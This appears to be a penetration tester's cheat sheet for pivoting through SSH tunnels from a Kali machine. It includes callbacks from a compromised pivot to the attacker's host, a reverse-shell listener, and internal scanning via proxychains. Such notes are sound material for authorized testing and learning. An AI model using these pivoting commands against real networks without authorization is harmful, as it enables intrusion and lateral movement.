# SSH tunnels

## Which one
- [ ] One internal service on a Kali port: -L
- [ ] A SOCKS proxy into the network: -D, or -R from the pivot when I cannot SSH in
- [ ] A port on the pivot that reaches Kali: -R
- [ ] The whole network with no proxychains: sshuttle
- [ ] A key instead of a password: -i id_rsa on any line here
-N forwards with no remote command, and -f sends the tunnel to the background after the login.

## One service: -L
ssh -N -L <LPORT>:<InternalIP>:<Port> '<Username>'@<PivotIP>
A service only on the pivot's localhost, from ss -tlnp there:
ssh -N -L <LPORT>:127.0.0.1:<Port> '<Username>'@<PivotIP>
Then on Kali:
nc -nv 127.0.0.1 <LPORT>
curl http://127.0.0.1:<LPORT>/
xfreerdp3 /v:127.0.0.1:<LPORT> /u:'<Username>' /p:'<Password>' /cert:ignore
- [ ] The far end is resolved on the pivot: 127.0.0.1 there is the pivot itself

## A SOCKS proxy: -D
ssh -N -D 1080 '<Username>'@<PivotIP>
Kali's proxychains points at Tor's port; this makes it use the proxy instead:
sudo sed -i 's/^socks4.*9050$/socks5 127.0.0.1 1080/' /etc/proxychains4.conf
proxychains -q nmap -sT -Pn --top-ports 100 <InternalIP>
proxychains -q nxc smb <Subnet>/<CIDR>
- [ ] -sT and -Pn every time: SYN scans, UDP and ping do not cross a SOCKS proxy

## A SOCKS proxy when I cannot SSH in
The pivot logs in to Kali instead, with OpenSSH 7.6 or later there. On Kali, a throwaway account, since the pivot sees its password:
sudo useradd -m -s /usr/sbin/nologin tunnel
sudo passwd tunnel
sudo systemctl start ssh
On the pivot:
ssh -N -o StrictHostKeyChecking=no -R 1080 tunnel@<LHOST>
- [ ] The password prompt needs a real terminal: upgrade the shell first, :Pb shells
- [ ] Proxychains on Kali uses socks5 127.0.0.1 1080, as with -D

## Kali reachable from the pivot: -R
My listener on the pivot's port:
ssh -N -R <LPORT>:127.0.0.1:<LPORT> '<Username>'@<PivotIP>
rlwrap nc -lvnp <LPORT>
serve on the pivot's 8080, from serve's port, which is 80 as root and 8000 otherwise:
ssh -N -R 8080:<LHOST>:80 '<Username>'@<PivotIP>
- [ ] On the pivot, the line serve files prints, with <LHOST> changed to 127.0.0.1:8080
- [ ] The forward binds the pivot's 127.0.0.1 only, unless its sshd has GatewayPorts yes: for other internal hosts, relay it with :Pb socat

## Through the pivot to an internal host
ssh -J '<Username>'@<PivotIP> '<Username>'@<InternalIP>
A SOCKS proxy on the second host, for the network beyond it:
ssh -N -J '<Username>'@<PivotIP> -D 1081 '<Username>'@<InternalIP>
- [ ] Proxychains pointed at 1081 for that network: a copy of the file, used with -f
cp /etc/proxychains4.conf pivot2.conf
- [ ] The last line of pivot2.conf is socks5 127.0.0.1 1081
proxychains -q -f pivot2.conf nxc smb THE-SECOND-NETWORK

## sshuttle
Routes the network like a VPN, with no proxychains. It asks for sudo on Kali and needs Python 3 on the pivot.
sshuttle -r '<Username>'@<PivotIP> <Subnet>/<CIDR>
sshuttle -r '<Username>'@<PivotIP> <Subnet>/<CIDR> -e 'ssh -i id_rsa'
nmap -sT -Pn -p 22,80,445 <InternalIP>
- [ ] TCP only, and DNS with --dns: still no ping and no SYN scans

## Keep it up, and stop it
ssh -f -N -o ServerAliveInterval=30 -o ServerAliveCountMax=3 -D 1080 '<Username>'@<PivotIP>
pgrep -af 'ssh .*-N'
pkill -f 'ssh .*-N'
- [ ] sshd stopped on Kali and the throwaway account removed
sudo systemctl stop ssh
sudo userdel -r tunnel
